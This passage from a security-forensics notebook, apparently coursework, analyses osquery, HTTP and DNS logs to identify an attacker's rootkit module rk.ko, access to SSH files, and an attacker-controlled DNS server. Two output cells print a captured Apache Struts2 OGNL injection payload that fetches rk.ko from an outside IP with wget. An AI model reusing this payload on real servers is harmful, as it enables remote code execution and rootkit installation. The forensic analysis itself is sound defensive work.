   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>name</th>\n",
       "      <th>hostIdentifier</th>\n",
       "      <th>calendarTime</th>\n",
       "      <th>unixTime</th>\n",
       "      <th>epoch</th>\n",
       "      <th>counter</th>\n",
       "      <th>action</th>\n",
       "      <th>decorations.host_uuid</th>\n",
       "      <th>decorations.username</th>\n",
       "      <th>columns.name</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>kernel_module</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:34:09 2018 UTC</td>\n",
       "      <td>1517877249</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td></td>\n",
       "      <td>rk</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>kernel_module</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:34:09 2018 UTC</td>\n",
       "      <td>1517877249</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td></td>\n",
       "      <td>ipt_MASQUERADE</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>kernel_module</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:34:09 2018 UTC</td>\n",
       "      <td>1517877249</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td></td>\n",
       "      <td>nf_nat_masquerade_ipv4</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>kernel_module</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:34:09 2018 UTC</td>\n",
       "      <td>1517877249</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td></td>\n",
       "      <td>nf_conntrack_netlink</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>kernel_module</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:34:09 2018 UTC</td>\n",
       "      <td>1517877249</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td></td>\n",
       "      <td>nfnetlink</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "            name hostIdentifier                  calendarTime    unixTime  \\\n",
       "0  kernel_module         ubuntu  Tue Feb  6 00:34:09 2018 UTC  1517877249   \n",
       "1  kernel_module         ubuntu  Tue Feb  6 00:34:09 2018 UTC  1517877249   \n",
       "2  kernel_module         ubuntu  Tue Feb  6 00:34:09 2018 UTC  1517877249   \n",
       "3  kernel_module         ubuntu  Tue Feb  6 00:34:09 2018 UTC  1517877249   \n",
       "4  kernel_module         ubuntu  Tue Feb  6 00:34:09 2018 UTC  1517877249   \n",
       "\n",
       "  epoch counter action                 decorations.host_uuid  \\\n",
       "0     0       0  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "1     0       0  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "2     0       0  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "3     0       0  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "4     0       0  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "\n",
       "  decorations.username            columns.name  \n",
       "0                                           rk  \n",
       "1                               ipt_MASQUERADE  \n",
       "2                       nf_nat_masquerade_ipv4  \n",
       "3                         nf_conntrack_netlink  \n",
       "4                                    nfnetlink  "
      ]
     },
     "execution_count": 14,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "kernel_df = df_osquery[df_osquery['name'] == 'kernel_module'].dropna(axis = 1).reset_index(drop = True)\n",
    "kernel_df.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array(['rk', 'ipt_MASQUERADE', 'nf_nat_masquerade_ipv4',\n",
       "       'nf_conntrack_netlink', 'nfnetlink', 'xfrm_user', 'xfrm_algo',\n",
       "       'iptable_nat', 'nf_conntrack_ipv4', 'nf_defrag_ipv4',\n",
       "       'nf_nat_ipv4', 'xt_addrtype', 'iptable_filter', 'ip_tables',\n",
       "       'xt_conntrack', 'x_tables', 'nf_nat', 'nf_conntrack',\n",
       "       'br_netfilter', 'bridge', 'stp', 'llc', 'overlay', 'ppdev',\n",
       "       'intel_powerclamp', 'crct10dif_pclmul', 'crc32_pclmul',\n",
       "       'ghash_clmulni_intel', 'aesni_intel', 'aes_x86_64', 'lrw',\n",
       "       'vboxvideo', 'gf128mul', 'glue_helper', 'ablk_helper', 'cryptd',\n",
       "       'ttm', 'drm_kms_helper', 'snd_intel8x0', 'snd_ac97_codec',\n",
       "       'ac97_bus', 'input_leds', 'joydev', 'serio_raw', 'snd_pcm', 'drm',\n",
       "       'fb_sys_fops', 'snd_timer', 'syscopyarea', 'sysfillrect',\n",
       "       'i2c_piix4', 'snd', 'sysimgblt', 'soundcore', 'vboxguest',\n",
       "       '8250_fintek', 'parport_pc', 'parport', 'mac_hid', 'autofs4',\n",
       "       'hid_generic', 'usbhid', 'hid', 'psmouse', 'ahci', 'libahci',\n",
       "       'e1000', 'pata_acpi', 'fjes', 'video', 'xt_nat', 'xt_tcpudp',\n",
       "       'veth', 'floppy', 'xor', 'raid6_pq', 'ufs', 'qnx4', 'hfsplus',\n",
       "       'hfs', 'minix', 'ntfs', 'msdos', 'jfs', 'xfs', 'libcrc32c',\n",
       "       'btrfs', 'nfnetlink_queue', 'nfnetlink_log', 'bluetooth'],\n",
       "      dtype=object)"
      ]
     },
     "execution_count": 15,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "kernel_df['columns.name'].unique()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[False, False, False, False, False, True]"
      ]
     },
     "execution_count": 16,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "'''\n",
    "GET requested content_type from Task1.2\n",
    "Should find a string with .ko somwhere in the malicious content type\n",
    "From the 'commands' cell, we see that the command \"wget\" is only TRUE for the longest content_type in the df\n",
    "Thus we need to check the string in contentheaderlog_df.loc[5,'header'] for possible hidden wget commands installing a .ko file\n",
    "Visual inspection yields that rk.ko is installed maliciously, thus that is the attacker kernel module.\n",
    "\n",
    "'''\n",
    "[True if \"ko\" and \"wget\" in contentheaderlog_df.loc[i,'header'] else False for i in range(len(contentheaderlog_df))]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget http://162.212.156.148/rk.ko > rk.ko').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\""
      ]
     },
     "execution_count": 17,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "contentheaderlog_df.loc[5,'header']"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### The attacker kernel module is rk.ko"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    " "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>name</th>\n",
       "      <th>hostIdentifier</th>\n",
       "      <th>calendarTime</th>\n",
       "      <th>unixTime</th>\n",
       "      <th>epoch</th>\n",
       "      <th>counter</th>\n",
       "      <th>action</th>\n",
       "      <th>decorations.host_uuid</th>\n",
       "      <th>decorations.username</th>\n",
       "      <th>columns.name</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>301</th>\n",
       "      <td>kernel_module</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Mon Mar 19 15:58:54 2018 UTC</td>\n",
       "      <td>1521475134</td>\n",
       "      <td>0</td>\n",
       "      <td>100</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>root</td>\n",
       "      <td>rk</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>302</th>\n",
       "      <td>kernel_module</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Mon Mar 19 15:58:58 2018 UTC</td>\n",
       "      <td>1521475138</td>\n",
       "      <td>0</td>\n",
       "      <td>104</td>\n",
       "      <td>removed</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>root</td>\n",
       "      <td>rk</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "              name hostIdentifier                  calendarTime    unixTime  \\\n",
       "301  kernel_module         ubuntu  Mon Mar 19 15:58:54 2018 UTC  1521475134   \n",
       "302  kernel_module         ubuntu  Mon Mar 19 15:58:58 2018 UTC  1521475138   \n",
       "\n",
       "    epoch counter   action                 decorations.host_uuid  \\\n",
       "301     0     100    added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "302     0     104  removed  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "\n",
       "    decorations.username columns.name  \n",
       "301                 root           rk  \n",
       "302                 root           rk  "
      ]
     },
     "execution_count": 18,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#We only consider the os queries for rk.ko after the first attack attempt unixTime\n",
    "kernel_df[(kernel_df['columns.name'] == 'rk') & (kernel_df['unixTime'] > str(firstattack_timestamp))]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Since the module rk.ko was \"added\" (as seen in the action column), we can say that the attacker kernel is loaded."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    " "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>name</th>\n",
       "      <th>hostIdentifier</th>\n",
       "      <th>calendarTime</th>\n",
       "      <th>unixTime</th>\n",
       "      <th>epoch</th>\n",
       "      <th>counter</th>\n",
       "      <th>action</th>\n",
       "      <th>decorations.host_uuid</th>\n",
       "      <th>decorations.username</th>\n",
       "      <th>columns.name</th>\n",
       "      <th>...</th>\n",
       "      <th>columns.md5</th>\n",
       "      <th>columns.mode</th>\n",
       "      <th>columns.mtime</th>\n",
       "      <th>columns.sha1</th>\n",
       "      <th>columns.sha256</th>\n",
       "      <th>columns.size</th>\n",
       "      <th>columns.target_path</th>\n",
       "      <th>columns.time</th>\n",
       "      <th>columns.transaction_id</th>\n",
       "      <th>columns.uid</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>system_info</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:33:05 2018 UTC</td>\n",
       "      <td>1517877185</td>\n",
       "      <td>0</td>\n",
       "      <td>38463</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>root</td>\n",
       "      <td>rk</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>pack_fim_file_events</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:33:49 2018 UTC</td>\n",
       "      <td>1517877229</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>root</td>\n",
       "      <td>NaN</td>\n",
       "      <td>...</td>\n",
       "      <td>0d4f52b9dacac07cf2316d1686cc707c</td>\n",
       "      <td>0644</td>\n",
       "      <td>1517877228</td>\n",
       "      <td>cffc9b8ead76006419975c0d22ba49d5fdf001a0</td>\n",
       "      <td>43d11069f7682e63289f38d184e4193f7486502f099250...</td>\n",
       "      <td>4096</td>\n",
       "      <td>/etc/osquery/.osquery.conf.swp</td>\n",
       "      <td>1517877228</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>pack_fim_file_events</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:33:49 2018 UTC</td>\n",
       "      <td>1517877229</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>root</td>\n",
       "      <td>NaN</td>\n",
       "      <td>...</td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td>/etc/osquery/.osquery.conf.swx</td>\n",
       "      <td>1517877228</td>\n",
       "      <td>0</td>\n",
       "      <td></td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>pack_fim_file_events</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:33:49 2018 UTC</td>\n",
       "      <td>1517877229</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>root</td>\n",
       "      <td>NaN</td>\n",
       "      <td>...</td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td>/etc/osquery/.osquery.conf.swx</td>\n",
       "      <td>1517877228</td>\n",
       "      <td>0</td>\n",
       "      <td></td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>pack_fim_file_events</td>\n",
       "      <td>ubuntu</td>\n",
       "      <td>Tue Feb  6 00:33:49 2018 UTC</td>\n",
       "      <td>1517877229</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>added</td>\n",
       "      <td>D5882FBF-1D65-4A30-B216-77F664B7D3B0</td>\n",
       "      <td>root</td>\n",
       "      <td>NaN</td>\n",
       "      <td>...</td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td>/etc/osquery/.osquery.conf.swx</td>\n",
       "      <td>1517877228</td>\n",
       "      <td>0</td>\n",
       "      <td></td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>5 rows × 27 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                   name hostIdentifier                  calendarTime  \\\n",
       "0           system_info         ubuntu  Tue Feb  6 00:33:05 2018 UTC   \n",
       "1  pack_fim_file_events         ubuntu  Tue Feb  6 00:33:49 2018 UTC   \n",
       "2  pack_fim_file_events         ubuntu  Tue Feb  6 00:33:49 2018 UTC   \n",
       "3  pack_fim_file_events         ubuntu  Tue Feb  6 00:33:49 2018 UTC   \n",
       "4  pack_fim_file_events         ubuntu  Tue Feb  6 00:33:49 2018 UTC   \n",
       "\n",
       "     unixTime epoch counter action                 decorations.host_uuid  \\\n",
       "0  1517877185     0   38463  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "1  1517877229     0       0  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "2  1517877229     0       0  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "3  1517877229     0       0  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "4  1517877229     0       0  added  D5882FBF-1D65-4A30-B216-77F664B7D3B0   \n",
       "\n",
       "  decorations.username columns.name  ...                       columns.md5  \\\n",
       "0                 root           rk  ...                               NaN   \n",
       "1                 root          NaN  ...  0d4f52b9dacac07cf2316d1686cc707c   \n",
       "2                 root          NaN  ...                                     \n",
       "3                 root          NaN  ...                                     \n",
       "4                 root          NaN  ...                                     \n",
       "\n",
       "  columns.mode columns.mtime                              columns.sha1  \\\n",
       "0          NaN           NaN                                       NaN   \n",
       "1         0644    1517877228  cffc9b8ead76006419975c0d22ba49d5fdf001a0   \n",
       "2                                                                        \n",
       "3                                                                        \n",
       "4                                                                        \n",
       "\n",
       "                                      columns.sha256 columns.size  \\\n",
       "0                                                NaN          NaN   \n",
       "1  43d11069f7682e63289f38d184e4193f7486502f099250...         4096   \n",
       "2                                                                   \n",
       "3                                                                   \n",
       "4                                                                   \n",
       "\n",
       "              columns.target_path columns.time columns.transaction_id  \\\n",
       "0                             NaN          NaN                    NaN   \n",
       "1  /etc/osquery/.osquery.conf.swp   1517877228                      0   \n",
       "2  /etc/osquery/.osquery.conf.swx   1517877228                      0   \n",
       "3  /etc/osquery/.osquery.conf.swx   1517877228                      0   \n",
       "4  /etc/osquery/.osquery.conf.swx   1517877228                      0   \n",
       "\n",
       "  columns.uid  \n",
       "0         NaN  \n",
       "1           0  \n",
       "2              \n",
       "3              \n",
       "4              \n",
       "\n",
       "[5 rows x 27 columns]"
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df_osquery.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array(['/root/.ssh/id_rsa', '/root/.ssh/id_rsa.pub',\n",
       "       '/root/.ssh/known_hosts', '/root/.ssh/.known_hosts.swp',\n",
       "       '/root/.ssh/.known_hosts.swpx', '/root/.ssh/4913',\n",
       "       '/root/.ssh/known_hosts~'], dtype=object)"
      ]
     },
     "execution_count": 20,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "'''\n",
    "Since we know the attacker has to access the .ssh folder to get to internal host names,\n",
    "we find all target paths which have .ssh folder.\n",
    "It is clear that the .known_hosts.swp file should contain internal hostnames. \n",
    "'''\n",
    "mask = [True if \".ssh\" in path else False for path in df_osquery['columns.target_path'].dropna().unique()]\n",
    "df_osquery['columns.target_path'].dropna().unique()[mask]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The .known_hosts.swp file should contain internal hostnames"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    " "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Attacker not naive as known_hosts file name was not observed in any of the content-types\n"
     ]
    }
   ],
   "source": [
    "i = 0\n",
    "for pkt in http:    \n",
    "    try:\n",
    "        if \"known_hosts\" in pkt.http.content_type:\n",
    "            print(pkt.http.content_type)\n",
    "            i+=1            \n",
    "    except AttributeError:\n",
    "        pass\n",
    "if i==0:\n",
    "    print('Attacker not naive as known_hosts file name was not observed in any of the content-types')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "DNS Port Analysis:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>timestamp</th>\n",
       "      <th>highest_layer</th>\n",
       "      <th>length</th>\n",
       "      <th>dest_ip</th>\n",
       "      <th>source_ip</th>\n",
       "      <th>dest_port</th>\n",
       "      <th>source_port</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>1.521397e+09</td>\n",
       "      <td>DNS</td>\n",
       "      <td>88</td>\n",
       "      <td>162.212.156.148</td>\n",
       "      <td>10.0.2.15</td>\n",
       "      <td>53</td>\n",
       "      <td>43204</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>1.521397e+09</td>\n",
       "      <td>DNS</td>\n",
       "      <td>93</td>\n",
       "      <td>10.0.2.15</td>\n",
       "      <td>162.212.156.148</td>\n",
       "      <td>43204</td>\n",
       "      <td>53</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>1.521397e+09</td>\n",
       "      <td>DNS</td>\n",
       "      <td>88</td>\n",
       "      <td>162.212.156.148</td>\n",
       "      <td>10.0.2.15</td>\n",
       "      <td>53</td>\n",
       "      <td>43204</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>1.521397e+09</td>\n",
       "      <td>DNS</td>\n",
       "      <td>93</td>\n",
       "      <td>10.0.2.15</td>\n",
       "      <td>162.212.156.148</td>\n",
       "      <td>43204</td>\n",
       "      <td>53</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>1.521397e+09</td>\n",
       "      <td>DNS</td>\n",
       "      <td>88</td>\n",
       "      <td>162.212.156.148</td>\n",
       "      <td>10.0.2.15</td>\n",
       "      <td>53</td>\n",
       "      <td>43204</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "      timestamp highest_layer length          dest_ip        source_ip  \\\n",
       "0  1.521397e+09           DNS     88  162.212.156.148        10.0.2.15   \n",
       "1  1.521397e+09           DNS     93        10.0.2.15  162.212.156.148   \n",
       "2  1.521397e+09           DNS     88  162.212.156.148        10.0.2.15   \n",
       "3  1.521397e+09           DNS     93        10.0.2.15  162.212.156.148   \n",
       "4  1.521397e+09           DNS     88  162.212.156.148        10.0.2.15   \n",
       "\n",
       "  dest_port source_port  \n",
       "0        53       43204  \n",
       "1     43204          53  \n",
       "2        53       43204  \n",
       "3     43204          53  \n",
       "4        53       43204  "
      ]
     },
     "execution_count": 22,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df_dns_useful = df_dns[(df_dns['source_port']=='53') | (df_dns['dest_port']=='53') ]\n",
    "df_dns_useful.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "10.0.2.15          1141\n",
       "162.212.156.148    1118\n",
       "75.75.75.75          21\n",
       "Name: source_ip, dtype: int64"
      ]
     },
     "execution_count": 23,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df_dns_useful['source_ip'].value_counts()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Thus there are 2 main DNS servers accepting queries : **10.0.2.15** and **162.212.156.14**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget http://162.212.156.148/rk.ko > rk.ko').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\""
      ]
     },
     "execution_count": 24,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "http[539].http.content_type"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We see that the attacker uses the server 162.212.156.148 to download the rk kernel module.\n",
    "\n",
    "Thus, **162.212.156.148 is the attacker controlled DNS server** and **10.0.2.15 is the legitimate DNS server.**\n",
    "\n",
    " "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "legitimate_dns_lengths = df_dns_useful[df_dns_useful['source_ip']=='10.0.2.15'].length.tolist()\n",
    "attacker_dns_lengths = df_dns_useful[df_dns_useful['source_ip']=='162.212.156.148'].length.tolist()\n",
    "\n",
    "legitimate_dns_lengths = [int(i) for i in legitimate_dns_lengths]\n",
    "attacker_dns_lengths = [int(i) for i in attacker_dns_lengths]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 720x720 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "plt.figure(figsize=(10,10))\n",
    "plt.hist(attacker_dns_lengths,bins = 50, label = 'attacker')\n",
    "plt.hist(legitimate_dns_lengths,bins = 50, label = 'legitimate')\n",
    "plt.title('Distributions of query lengths for DNS servers')\n",
    "plt.legend()\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "*(Seaborn was not importing for some reason. Please do sns.distplot fot the distribution instead of plt.hist, the correct plots are in the ppt)*"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Task 2 "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "G = FactorGraph() ## Create FactorGraph object\n",
    "###############################\n",
    "#   TODO: Define factor functions\n",
    "###############################\n",
    "f_1 = DiscreteFactor(['S1'],[2],[0.85, 0.15]) #This is the prior 'f'\n",
    "f_2 = DiscreteFactor(['S1','E1'], [2,2], [0.1, 0.2, 0.0, 0.5])\n",
    "\n",
    "###############################\n",
    "#   TODO: Add random variables\n",
    "#         and factor functions \n",
    "###############################\n",
    "G.add_nodes_from(['S1','E1'])  ## Add random variables \n",
